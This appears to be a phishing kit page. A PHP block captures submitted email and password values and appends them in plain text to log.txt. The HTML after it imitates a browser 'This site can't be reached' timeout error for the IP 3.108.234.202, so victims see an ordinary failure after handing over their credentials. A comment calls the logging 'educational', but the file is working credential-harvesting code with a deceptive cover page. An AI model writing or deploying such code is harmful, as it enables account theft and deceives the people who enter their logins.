<?php
$email = $_POST['email'];
    $password = $_POST['password'];
    
    // Log the captured data (for educational purposes)
    $file = fopen("log.txt", "a");
    fwrite($file, "Email: $email | Password: $password\n");
    fclose($file);
    
    // echo "Login failed. Please try again."


    ?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Can't Be Reached</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #5f6368;
        }

        .container {
            text-align: center;
        }

        .error-box {
            max-width: 600px;
            padding: 20px;
        }

        .icon {
            font-size: 40px;
            margin-bottom: 20px;
        }

        .title {
            font-size: 24px;
            color: #202124;
            margin-bottom: 10px;
        }

        .subtitle {
            font-size: 16px;
            margin-bottom: 20px;
        }

        .try-section {
            text-align: left;
            margin: 20px 0;
        }

        .try-section ul {
            margin: 10px 0 0;
            padding-left: 20px;
        }

        .try-section ul li {
            font-size: 14px;
            margin-bottom: 8px;
        }

        .try-section ul li a {
            text-decoration: none;
            color: #1a73e8;
        }

        .try-section ul li a:hover {
            text-decoration: underline;
        }

        .error-code {
            font-size: 12px;
            color: #80868b;
            margin: 20px 0;
        }

        .reload-button {
            padding: 10px 20px;
            font-size: 14px;
            color: white;
            background-color: #1a73e8;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .reload-button:hover {
            background-color: #155db0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="error-box">
            <div class="icon">📄😟</div>
            <h1 class="title">This site can’t be reached</h1>
            <p class="subtitle">3.108.234.202 took too long to respond.</p>
            <div class="try-section">
                <p>Try:</p>
                <ul>
                    <li>Checking the connection</li>
                    <li><a href="#">Checking the proxy and the firewall</a></li>
                    <li><a href="#">Running Windows Network Diagnostics</a></li>
                </ul>
            </div>
            <p class="error-code">ERR_CONNECTION_TIMED_OUT</p>
            <button class="reload-button">Reload</button>
        </div>
    </div>
</body>
</html>


<!-- <style>
  @keyframes fadeIn {
    0% { opacity: 0; }
    100% { opacity: 1; }
  }
</style> -->




<?php

?>